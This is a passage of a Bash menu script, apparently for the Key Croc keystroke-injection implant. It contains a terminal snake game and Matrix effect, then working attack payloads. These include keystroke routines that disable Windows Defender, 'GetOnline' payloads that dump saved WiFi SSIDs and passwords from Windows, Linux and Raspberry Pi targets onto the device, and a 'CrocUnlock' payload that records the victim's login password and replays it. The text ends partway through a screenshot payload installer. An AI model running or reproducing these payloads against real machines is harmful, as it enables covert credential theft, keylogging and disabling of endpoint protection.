function new_level() {
	unset HOUSENKA
	for i in ${!FOOD[@]}; do unset FOOD[$i]; done # erase leaves and poison
	clear
	draw_area
	FOOD_NUMBER=$[DEFAULT_FOOD_NUMBER*=2]
	gen_food
	HX=$[MW/2] HY=$[MH/2]  # start position in the middle of the screen
	# body initialization
	HOUSENKA=([0]="$[HY-2];$HX" [1]="$[HY-1];$HX" [2]="$HY;$HX")
	KEY=''
	C=2
	trap move ALRM
}
function title_screen() {
TITLE="QlpoOTFBWSZTWWMw1D8AAnd//X38AIhAA/24Cg2UCD7H13BVRH9ktkYEBAgAEABQ
BHgAEQBSlBJEQhqaA0ZDQBoA0ABpoBo9Rk0Ghw00wQyGmmRkwgGmgDCaNMmABA0E
KRJCTTIDIAAAAAyBkNDQNNHqHDTTBDIaaZGTCAaaAMJo0yYAEDQ4aaYIZDTTIyYQ
DTQBhNGmTAAgadZFPhSv08GL4IDbz4ctYPMQnUncHF0csCYaeprXNsFiBI3jqAqr
eZINIEZYBM0vKFjDLrT3O9d7u0YdyNmszDTqrCoaow3YRJGmq1mpO9ZAbqoXLRBc
sNPFvNGSbnbbDlhVhwUxhQ2lyXlxhssjLVysN8tVGpyiODkVooK4kzcZBVBBouKq
K4k3RKUuppicgMDWCYG23aU3vWmMOHN8HBjaSTYb43vjg4bTqDizjjW5iojfdt7O
DhnoedhCmSaWgoUq6IyuzGTVFAUs66ujrbwJmIp54zi8U0Jvl2dG7jlOcZy0IU8Q
HY32Ojyejm45lswDjSi5KwUwUUlAIQ01SRKUtKU1Hjwg4A7BIMFZ3MMYMQHc2nHg
Fi88aPlyBeYkZTTyRgUml+nl5p3CxSMeGHDUCBTstZpOZckIU8f7lIckxlKZ53hT
YzK0p+YzytGd2hNg2ZCrUpkv09fqowZ9vLuiQCDnIRUPoBDAIVRIZkQO0AKOpQ0o
msRVHATFQU7vc7/1AfWSlJFEkFIrRKQUlVRCSlVNUlLQDMCxBAlAlIkEQTMFMkTM
KkKVBJARFVEBD9hI9tR52USwDECnHMMIoyMqxgMsg0BodaBnMaMbCUaR1ZLkoYFR
EgUFAFNBEoxRgYJqQNQg9r4/g7vn+99/Gsj4bVxAAJfFf177dEjRn5b+cAhI82SQ
jRPNoFhdnAMJcvMkDUJEOiRqlRWaGSUhKgJZGIkiEkGS/jv9e9m2vitRmRjm0T38
FrpAS4kkIYQliBkCQnEYYP80AEjqXFAyVSw1tRWIFcZFUcAwaeljJUjJfQ8Ph9X1
Q+3t/mIXWLjCLuLwg1WEYiUo038wzoqSHpSaSOKUde7LhfHRdQzqlxs3rJKmOROc
o6Y6ZDm+THkzMzIdPXzUOo4RVH/xdyRThQkGMw1D8A=="
	SCR=`echo "$TITLE" | base64 -d | bzcat` #unpack main screen
	local i j IFS=$'\n'
	clear
	# center on screen
	for ((j=0;j<$[(MH-25)/2];j++)) do echo; done
	for i in $SCR
	do
		for ((j=0;j<$[(MW-63)/2];j++)) do echo -n " "; done
		printf "%s\n" $i
	done
	read
}
function game_info() {
	printf "\e[$[MH+1];0fHráč: $USER (Nejlepší výkon: $TOP_SCORE)"
	printf "\e[$[MH+1];$[MW-12]fSkóre: %5d" $SCORE
}
########
# MAIN #
########
exec 2>/dev/null
trap at_exit ERR EXIT 
if [ -f $CONFIG ] ; then
	TOP_SCORE=$(cat $CONFIG)
else
	TOP_SCORE=0
fi
title_screen
new_level
move
while :
do
	read -rsn3 -d '' PRESS
	KEY=${PRESS:2}
done
}
##
#   - Pass time Matrix effect
##
function matrix_effect() {
N_LINE=$(( $(tput lines) - 1));
N_COLUMN=$(tput cols);
get_char() {
	RANDOM_U=$(echo $(( (RANDOM % 9) + 0)));
	RANDOM_D=$(echo $(( (RANDOM % 9) + 0)));
	CHAR_TYPE="\u04"
	printf "%s" "$CHAR_TYPE$RANDOM_D$RANDOM_U";
}
cursor_position() {
	echo "\033[$1;${RANDOM_COLUMN}H";
}
write_char() {
	CHAR=$(get_char);
	print_char $1 $2 $CHAR
}
erase_char() { 
	CHAR="\u0020"
	print_char $1 $2 $CHAR
}
print_char() {
	CURSOR=$(cursor_position $1);
	echo -e "$CURSOR$2$3";
}
draw_line() {
	RANDOM_COLUMN=$[RANDOM%N_COLUMN];
	RANDOM_LINE_SIZE=$(echo $(( (RANDOM % $N_LINE) + 1)));
	SPEED=0.05
	COLOR="\033[32m";
	COLOR_HEAD="\033[37m";
	for i in $(seq 1 $N_LINE ); do 
		write_char $[i-1] $COLOR;
		write_char $i $COLOR_HEAD;
		sleep $SPEED;
		if [ $i -ge $RANDOM_LINE_SIZE ]; then 
		erase_char $[i-RANDOM_LINE_SIZE]; 
		fi;
	done;
	for i in $(seq $[i-$RANDOM_LINE_SIZE] $N_LINE); do 
		erase_char $i
		sleep $SPEED;
	done
}
matrix() {
	tput setab 000
	clear
	while true; do
		draw_line &
		sleep 0.5;
	done
}
matrix ;
}
##
#   - Pass time Menu
##
MenuTitle PASS TIME GAMES
MenuColor 1 CHESS ; echo -ne "               ${clear}\n"
MenuColor 2 TETRIS ; echo -ne "              ${clear}\n"
MenuColor 3 SNAKE ; echo -ne "               ${clear}\n"
MenuColor 4 MATRIX ; echo -ne "              ${clear}\n"
MenuColor 5 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
MenuEnd
	case $m_a in
	1) chess_game ; pass_time ;;
	2) tetris_game ; pass_time ;;
	3) snake_game ; pass_time ;;
	4) matrix_effect ; pass_time ;;
	5) main_menu ;;
	0) exit 0 ;;
	[bB]) menu_B ;;
	*) invalid_entry ; pass_time ;;
	esac
}
##
#----Windows defender ENABLE/DISABLE Function
##
windows_defender() {
	clear
##
#----Windows defender enable Function
##
defender_enable() {
	Q GUI i
	sleep 3
	Q STRING "Windows Security settings"
	Q ENTER
	sleep 3
	Q ENTER
	sleep 3
	Q TAB
	Q ENTER
	sleep 3
	Q TAB
	Q TAB
	Q TAB
	Q TAB
	Q ENTER
	sleep 2
	Q LEFTARROW
	Q ENTER
	sleep 1
	Q ALT-F4
	sleep 1
	Q ALT-F4
}
##
#----Windows defender disable Function
##
defender_disable() {
	Q GUI i
	sleep 3
	Q STRING "Windows Security settings"
	Q ENTER
	sleep 3
	Q ENTER
	sleep 3
	Q TAB
	Q ENTER
	sleep 3
	Q TAB
	Q TAB
	Q TAB
	Q TAB
	Q ENTER
	sleep 2
	Q KEYCODE 00,00,2c
	sleep 2
	Q LEFTARROW
	Q ENTER
	sleep 1
	Q ALT-F4
	sleep 1
	Q ALT-F4
}
##
#----Windows defender ENABLE/DISABLE Menu
##
if [ "$(OS_CHECK)" = WINDOWS ]; then
MenuTitle WINDOWS DEFENDER
MenuColor 1 ENABLE WINDOWS DEFENDER ; echo -ne "  ${clear}\n"
MenuColor 2 DISABLE WINDOWS DEFENDER ; echo -ne " ${clear}\n"
MenuColor 3 RETURN TO MAIN MENU ; echo -ne "      ${clear}\n"
MenuEnd
	case $m_a in
	1) defender_enable ; croc_pot_plus ;;
	2) defender_disable ; croc_pot_plus ;;
	3) main_menu ;;
	0) exit 0 ;;
	[bB]) menu_B ;;
	*) invalid_entry ; windows_defender ;;
	esac
else
	echo -ne "\n\e[5m$(ColorRed '--The KeyCroc is not pluged into Windows pc This will not work on this OS')-->$(OS_CHECK)\n"
fi
}
##
#----Croc Pot Plus Install payloads
##
function install_payloads() {
	clear
	echo -ne "$(Info_Screen '-Select which Payload you would like to install')\n\n"
##
#----Getonline Payload Function
##
get_online_p() {
	clear
	local GETONLINE_WINDOWS=/root/udisk/payloads/Getonline_Windows.txt
	local GETONLINE_LINUX=/root/udisk/payloads/Getonline_Linux.txt
	local GETONLINE_RASPBERRY=/root/udisk/payloads/Getonline_Raspberry.txt
	echo -ne "$(Info_Screen '-Payload Called GetOnline
-Connect automatically to target pc WIFI (Windows/Linux/Raspberry)
-After install unplug and plug into target pc and type in below
-getonline <-- MATCH word for windows
-linuxonline <-- MATCH word for Linux
-rasponline <-- MATCH word for Raspberry pi
-When done the led will light up green unplug keycroc and plug back in
-The keycroc should now be connected to the target pc wifi')\n\n"
##
#----Getonline Windows payload
##
if [ -e "${GETONLINE_WINDOWS}" ]; then
	echo -ne "\n${red}${LINE_}${clear}$(ColorGreen 'GETONLINE WINDOWS PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
else
	read_all INSTALL GETONLINE PAYLOAD FOR WINDOWS Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	echo -ne "# Title:           Windows Get online\n# Description:     Get online automatically to target pc wifi\n# Author:          spywill / RootJunky\n# Version:         2.4\n# Category:        Key Croc\n# Props:           Cribbit, Lodrix, potong
#\nMATCH getonline\nLOCK\nrm /root/udisk/tools/Croc_Pot/wifipass.txt\n# --> udisk unmount\nATTACKMODE HID STORAGE\nsleep 5\nLED ATTACK\nQ GUI r\nsleep 1\n# --> Start powershell\nQ STRING \"powershell -NoP -NonI -W Hidden\"\nQ ENTER\nsleep 2\n# --> Place keycroc usb drive into variable
Q STRING \"\\\$Croc = (gwmi win32_volume -f 'label=\\\"KeyCroc\\\"' | Select-Object -ExpandProperty DriveLetter)\"\nQ ENTER\nsleep 2\n# --> Retrieve taget pc SSID and PASSWD save to tools/Croc_Pot/wifipass.txt
Q STRING \"(netsh wlan show networks) | Select-String \\\"\:(.+)\\\$\\\" | % {\\\$name=\\\$_.Matches.Groups[1].Value.Trim(); \\\$_} | %{(netsh wlan show profile name=\\\"\\\$name\\\" key=clear)} | Select-String \\\"Key Content\W+\:(.+)\\\$\\\" | % {\\\$pass=\\\$_.Matches.Groups[1].Value.Trim(); \\\$_} | %{[PSCustomObject]@{ PROFILE_NAME=\\\$name;PASSWORD=\\\$pass }} | Out-File -Encoding UTF8 \\\"\\\$Croc\\\tools\Croc_Pot\wifipass.txt\\\"\"
Q ENTER\nsleep 2\nQ STRING \"exit\"\nQ ENTER\n# --> Returning to HID Mode\nATTACKMODE HID\nsleep 3\nLED SETUP\n# --> Remone any existing WIFI setting & Edit config.txt with sed & Stuff the line from wifipass.txt into the hold space when processing config.txt and append and manipulate that line when needed & Remove r end lines in config.txt file\n\$(sed -i 's/\( \)*/\1/g' /root/udisk/tools/Croc_Pot/wifipass.txt)
\$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\\\nWIFI_PASS\\\nSSH ENABLE' root/udisk/config.txt) && \$(sed -i -E -e '1{x;s#^#sed -n 4p root/udisk/tools/Croc_Pot/wifipass.txt#e;x};10{G;s/\\\n(\S+).*/ \1/};11{G;s/\\\n\S+//}' -e 's/\\\r//g' root/udisk/config.txt)\nsleep 2\nUNLOCK\nLED FINISH" >> ${GETONLINE_WINDOWS}
	echo -ne "\n${red}***${clear}$(ColorGreen 'GETONLINE WINDOWS PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLEDER')${red}***${clear}\n" ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; get_online_p ;;
esac
fi
##
#----Getonline Linux payload
##
if [ -e "${GETONLINE_LINUX}" ]; then
	echo -ne "\n${red}${LINE_}${clear}$(ColorGreen 'GETONLINE LINUX PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
else
	read_all INSTALL GETONLINE PAYLOAD FOR LINUX Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	echo -ne "# Title:           Linux Get online\n# Description:     Get online automatically to target pc wifi\n# Author:          spywill\n# Version:         1.0\n# Category:        Key Croc\n\nMATCH linuxonline\n
#---> Check for saved passwd run CrocUnlock payload first if not edit passwd below\nif [ -e \"/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered\" ]; then\n	PC_PW=\$(sed '\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\nelse\n#---> Edit LINUX-PC_PASSWD_HERE\n	PC_PW=LINUX\nfi\n
rm /root/udisk/tools/Croc_Pot/Linux_GetOnline.txt\nATTACKMODE HID STORAGE\nLED ATTACK\n#---> start target pc terminal\nQ ALT F2\nsleep 1\nQ STRING \"xterm\"\nQ ENTER\nsleep 1\n#---> Create keycroc directory, Mount keycroc usb drive to target pc, Make KeyCroc folder executable
Q STRING \"sudo mkdir /media/\\\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\\\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\\\$(whoami)/KeyCroc/\"\nQ ENTER\nsleep 1\n#---> Entering Linux passwd\nQ STRING \"\${PC_PW}\"\nQ ENTER\nsleep 1
#---> Place keycroc usb drive into variable\nQ STRING \"LINUX_ON=/media/\\\$(whoami)/KeyCroc/tools/Croc_Pot/Linux_GetOnline.txt\"\nQ ENTER\nsleep 1\n#---> Retrieve target PC SSID/PASSWD & save to tools/Croc_Pot/Linux_GetOnline.txt
Q STRING \"sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | sed -E -e 's/[/]//g' -e 's/etc//g' -e 's/NetworkManagersystem-connections//g' -e 's/.nmconnection:psk//g' | sed -n \\\"/\\\$(iw dev wlan0 info | grep ssid | awk '{print \\\$2}')/p\\\" | sed -e 's/=/ /g' | tee \\\${LINUX_ON}\"
Q ENTER\nsleep 2\n#---> Unmount keycroc usb drive\nQ STRING \"sudo umount /media/\\\$(whoami)/KeyCroc/\"\nQ ENTER\nsleep 1\n#---> Return back to ATTACKMODE HID mode\nATTACKMODE HID\n#---> Remove keycroc directory off target pc\nQ STRING \"sudo rmdir /media/\\\$(whoami)/KeyCroc/; exit\"\nQ ENTER
#---> Remone any existing WIFI setting & Stuff the line from Linux_GetOnline into the hold space when processing config.txt and append and manipulate that line when needed\n\$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\\\nWIFI_PASS\\\nSSH ENABLE' root/udisk/config.txt) && \$(sed -i -E -e '1{x;s#^#sed -n 1p root/udisk/tools/Croc_Pot/Linux_GetOnline.txt#e;x};10{G;s/\\\n(\S+).*/ \1/};11{G;s/\\\n\S+//}' root/udisk/config.txt)\nLED FINISH" >> ${GETONLINE_LINUX}
	echo -ne "\n${red}***${clear}$(ColorGreen 'GETONLINE LINUX PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLEDER')${red}***${clear}\n" ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; get_online_p ;;
esac
fi
##
#----Getonline Raspberry pi payload
##
if [ -e "${GETONLINE_RASPBERRY}" ]; then
	echo -ne "\n${red}${LINE_}${clear}$(ColorGreen 'GETONLINE RASPBERRY PI PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
else
	read_all INSTALL GETONLINE PAYLOAD FOR RASPBERRY PI Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	echo -ne "# Title:           Raspberry PI Get online\n# Description:     Get online automatically to target pc wifi\n# Author:          spywill\n# Version:         1.0\n# Category:        Key Croc\n#\nMATCH rasponline\n#\nrm /root/udisk/tools/Croc_Pot/Linux_GetOnline.txt\nATTACKMODE HID STORAGE
LED ATTACK\n# --> start Raspberry PI terminal\nQ GUI d\nQ CONTROL-ALT-F1\nsleep 1\nQ STRING \"cp -u /usr/share/applications/lxterminal.* /home/\\\$(whoami)/Desktop\"\nQ ENTER\nQ ALT-F7\nsleep 1\nQ STRING \"LXTerminal\"\nQ ENTER\nQ ENTER\nsleep 2
# --> Place keycroc usb drive into variable\nQ STRING \"LINUX_ON=/media/\\\$(whoami)/KeyCroc/tools/Croc_Pot/Linux_GetOnline.txt\"\nQ ENTER\nsleep 1\n# --> Retrieve Target current ssid (Wifi)\nQ STRING \"t_ssid=\\\$(iw dev wlan0 info | grep ssid | awk '{print \\\$2}')\"
Q ENTER\nsleep 1\n# --> Retrieve Target wifi passwd\nQ STRING \"t_pw=\\\$(sed -e '/ssid\ psk/,+1p' -ne \\\":a;/\\\$t_ssid/{n;h;p;x;ba}\\\" /etc/wpa_supplicant/wpa_supplicant.conf | sed 's/[[:space:]]//g' | sed 's/psk=\\\"\(.*\)\\\"/\1/')\"\nQ ENTER\nsleep 1\n# --> Save ssid & passwd to keycroc\nQ STRING \"echo \\\$t_ssid \\\$t_pw >> \\\${LINUX_ON}\"
Q ENTER\nsleep 3\nQ STRING \"exit\"\nQ ENTER\nATTACKMODE HID\nsleep 2\n# --> Remone any existing WIFI setting & Stuff the line from Linux_GetOnline into the hold space when processing config.txt and append and manipulate that line when needed
\$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\\\nWIFI_PASS\\\nSSH ENABLE' root/udisk/config.txt) && \$(sed -i -E -e '1{x;s#^#sed -n 1p root/udisk/tools/Croc_Pot/Linux_GetOnline.txt#e;x};10{G;s/\\\n(\S+).*/ \1/};11{G;s/\\\n\S+//}' root/udisk/config.txt)\nLED FINISH" >> ${GETONLINE_RASPBERRY}
	echo -ne "\n${red}***${clear}$(ColorGreen 'GETONLINE RASPBERRY PI PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLEDER')${red}***${clear}\n" ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; get_online_p ;;
esac
fi
}
##
#----CrocUnlock Payload Function
##
croc_unlock_p() {
	clear
	echo -ne "$(Info_Screen '-Start by pressing GUI + l this will bring you to login screen
-This will forus the user to enter password and save to tools/Croc_Pot
-This will create another payload called Croc_unlock_2.txt
-Next time at login screen type in crocunlock
-This will enter the user password and login
-First time running this may need to unplug and plug back in
-Tested on Windows,Raspberrypi,Linux')\n"
	echo -ne "$(ColorRed '
--THIS PAYLOAD IS RELYING ON THE ENTER KEY TO BE PRESSED\n 
--AFTER THE USER HAS ENTER THE PASSWORD\n
--WORK FOR PIN NUMBER TO AS LONG AS THE ENTER KEY HAS BE PRESSED AFTER\n')"
	echo -ne "\e[48;5;202;30m${LINE}${clear}\n"
if [ -e "/root/udisk/payloads/Croc_unlock_1.txt" ]; then
	echo -ne "\n${red}${LINE_}${clear}$(ColorGreen 'CROCUNLOCK PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
else
	read_all INSTALL CROCUNLOCK PAYLOAD Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	echo -ne "# Title:           CrocUnlock (payload #1)\n# Description:     Record keystrokes and save to tools/Croc_Pot and Create second payload called (CrocUnlock PAYLOAD #2)\n#                  Run Croc_Pot_Payload.txt first to get OS\n# Author:          spywill / RootJunky\n# Version:         1.4\n# Category:        Key Croc\n#\n#\nMATCH GUI-l\n#
CROC_UNLOCK=/root/udisk/payloads/Croc_unlock_2.txt\nFULL_IN=\"MAT\"\n#rm /root/udisk/tools/Croc_Pot/Croc_unlock.txt /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered\n#\nif [ -e \"/root/udisk/payloads/Croc_unlock_2.txt\" ]; then\n	LED B\nelse\n	LED SETUP\n	echo -e \"# Title:           CrocUnlock (PAYLOAD #2)\\\n# Description:     Log into Target pc with Match word crocunlock, Run CrocUnlock (PAYLOAD #1) first\\\n# Author:          RootJunky / Spywill\\\n# Version:         1.4\\\n# Category:        Key Croc\\\n#\\\n#\\\n\${FULL_IN}CH crocunlock
#\\\n\\\$(sed -i 's/crocunlock//g' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\\\nif [[ -e /root/udisk/tools/Croc_Pot/Croc_OS.txt && /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered ]]; then\\\n	case \\\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt) in\\\nWINDOWS)\n	Q CONTROL-SHIFT-LEFTARROW\\\n	Q DELETE\\\n	sleep 1\\\n	Q STRING \\\$(sed '\\\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\\\n	Q ENTER ;;\\\nLINUX)\\\n	case \\\$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt) in
raspberrypi)\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q STRING \\\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)\n	Q ENTER\\\n	sleep 1\\\n	Q STRING \\\$(sed '\\\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\\\n	Q ENTER ;;\\\nparrot)\\\n	Q CONTROL-SHIFT-LEFTARROW\\\n	Q DELETE\\\n	sleep 1\\\n	Q STRING \\\$(sed '\\\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)
	Q ENTER ;;\\\n*)\\\n	Q CONTROL-SHIFT-LEFTARROW\\\n	Q DELETE\\\n	sleep 1\\\n	Q STRING \\\$(sed '\\\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\\\n	Q ENTER ;;\\\n	esac\\\n	esac\\\nelse\\\n	LED R\\\nfi\" >> \${CROC_UNLOCK}\n	LED FINISH\nfi\n#\nif [ -e \"/root/udisk/tools/Croc_Pot/Croc_OS.txt\" ]; then\n	case \$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt) in\nWINDOWS)\n	sleep 1\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_unlock.txt UNTIL ENTER
	LED ATTACK ;;\nLINUX)\n	case \$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt) in\nraspberrypi)\n	Q CONTROL-ALT-F3\n	sleep 1\n	Q STRING \"\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)\"\n	Q ENTER\n	sleep 1\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_unlock.txt UNTIL ENTER\n	LED ATTACK ;;\nparrot)\n	sleep 1\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_unlock.txt UNTIL ENTER\n	LED ATTACK ;;\n*)\n	sleep 1\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_unlock.txt UNTIL ENTER
	LED ATTACK ;;\n	esac\n	esac\nelse\n	LED R\nfi" >> /root/udisk/payloads/Croc_unlock_1.txt
	echo -ne "\n${red}${LINE_}${clear}$(ColorGreen 'CROCUNLOCK PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')${red}${LINE_}${clear}\n" ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; croc_unlock_p ;;
esac
fi
}
##
#----Wifi Setup Payload Function
##
wifi_setup_p() {
	clear
	echo -ne "$(Info_Screen '-WITH THIS PAYLOAD YOU CAN CREATE MULTIPLE WIFI SETTING
-THE PURPOSE OF THIS PAYLOAD IS THAT IF YOU MOVE YOUR KEYCROC
-AROUND TO DIFFERENT WIFI ACCESS POINTS
-YOU CAN CREATE A PAYLOAD WITH MATCH WORD
-CONNECT TO WIFI ACCESS POINT QUICKLY
-BY TYPING YOUR MATCH WORD')\n"
while read_all ENTER A NAME FOR THIS PAYLOAD AND PRESS [ENTER]; do
	local PAYLOAD_FOLDER=/root/udisk/payloads/${r_a}.txt
if [ -e "${PAYLOAD_FOLDER}" ]; then
	echo -ne "\n${LINE_}\e[5m$(ColorRed 'THIS PAYLOAD ALREADY EXISTS PLEASE CHOOSE A DIFFERENT NAME')${LINE_}\n"
else
	touch ${PAYLOAD_FOLDER}
	echo -ne "$(ColorBlue 'ENTER THE MATCH WORD YOU WOULD LIKE TO USE AND PRESS [ENTER]'): "; read USER_MATCH
	echo -ne "$(ColorBlue 'ENTER THE SSID AND PRESS [ENTER]'): "; read USER_SSID
	echo -ne "$(ColorBlue 'ENTER THE PASSWORD AND PRESS [ENTER]'): "; read WIFI_PASS
	echo -ne "# Title:         WIFI-SETUP\n# Description:   Setup your wifi with adding your ssid and passwd\n# Author:        spywill\n# Version:       1.3\n# Category:      Key Croc\n#\n#\n
MATCH ${USER_MATCH}\nLED SETUP\n\$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID ${USER_SSID}\\\nWIFI_PASS ${WIFI_PASS}\\\nSSH ENABLE' /root/udisk/config.txt)\nsleep 1\nLED FINISH" >> ${PAYLOAD_FOLDER}
	echo -ne "\n${red}***${clear}$(ColorGreen 'WIFI_SET PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')${red}***${clear}\n
$(Info_Screen '--UNPLUG THE KEYCROC AND PLUG BACK IN
--TYPE IN YOUR MATCH WORD LED WILL LIGHT UP GREEN
--THEN UNPLUG THE KEYCROC AND PLUG BACK IN
--YOUR KEYCROC SHOULD NOW BE CONNECTED TO YOUR WIFI SETUP\n')\n"
break
fi
done
}
##
#----Create quick start (payload) for Croc_Pot
##
quick_croc_pot () {
	clear
	echo -ne "\n$(Info_Screen '-Create payload
-Quickly Start Croc_Pot without OS detection
-This is for when you Already ran OS detection on target pc by crocpot
-Match word is qspot')\n\n"
	local qs_croc=/root/udisk/payloads/Quick_start_Croc_Pot.txt
if [ -e "${qs_croc}" ]; then
	echo -ne "\n$(ColorGreen 'Quick_start_Croc_Pot PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')\n"
else
	read_all INSTALL QUICK START CROC_POT PAYLOAD Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	echo -ne "# Title:         Quick Start Croc_Pot\n# Description:   Quickly Start Croc_pot.sh bash script without OS detection\n#                Will need to run Croc_Pot_Payload.txt first before running this payload
#                This is for when you Already ran OS detection on target pc\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n#\nMATCH qspot\n#\nCROC_PW=$(sed -n 1p /tmp/CPW.txt)      #<-----Edit KEYCROC_PASSWD_HERE
echo \"\${CROC_PW}\" >> /tmp/CPW.txt\nQ GUI d\n#\nif [ \"\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\" = WINDOWS ]; then\n	LED R\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell\"\n	Q ENTER\n	sleep 3\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"
	Q ENTER\n	sleep 3\n	Q STRING \"\${CROC_PW}\"\n	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"\n	Q ENTER\nelse\nif [ \"\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\" = LINUX ]; then\n    HOST_CHECK=\$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\n    case \$HOST_CHECK in\n    raspberrypi)
	LED B\n	sleep 5\n	Q STRING \"LXTerminal\"\n	Q ENTER\n	Q ENTER\n	sleep 2\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"\n	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"
	Q ENTER ;;\n    parrot)\n	LED B\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"\n	Q ENTER\n	sleep 1\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"
	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"\n	Q ENTER ;;\n    *)\n	LED B\n	Q ALT F2\n	sleep 1\n	Q STRING \"xterm\"\n	Q ENTER\n	sleep 1\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"
	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"\n	Q ENTER ;;\n  esac\n fi\nfi\nLED FINISH" >> ${qs_croc}
	echo -ne "\n$(ColorGreen 'Quick_start_Croc_Pot PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER')\n" ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; quick_croc_pot ;;
esac
fi
}
##
#----Screenshot Croc_Shot function
##
screen_shot() {
	clear
	echo -ne "$(Info_Screen '-Option to install Croc_Shot.txt payload this will take screenshot of Target pc
-To start the Croc_Shot payload type in crocshot
-This will save to loot/Croc_pot/screenshot
-Option to take screenshot now
-For this to work properly run Croc_Pot_Payload.txt first to get OS detection')\n\n"
if [ -d /root/udisk/loot/Croc_pot/screenshot ]; then
	LED B
else
	mkdir /root/udisk/loot/Croc_pot/screenshot
fi
##
#----Screen Croc_Shot Payload install
##
	local Croc_Shot=/root/udisk/payloads/Croc_Shot.txt
if [ -e "${Croc_Shot}" ]; then
	echo -ne "\n${LINE_}$(ColorGreen 'Croc_Shot.txt Payload is installed check payload folder')${LINE_}\n\n"
else
	read_all WOULD YOU LIKE TO INSTALL CROC_SHOT PAYLOAD Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
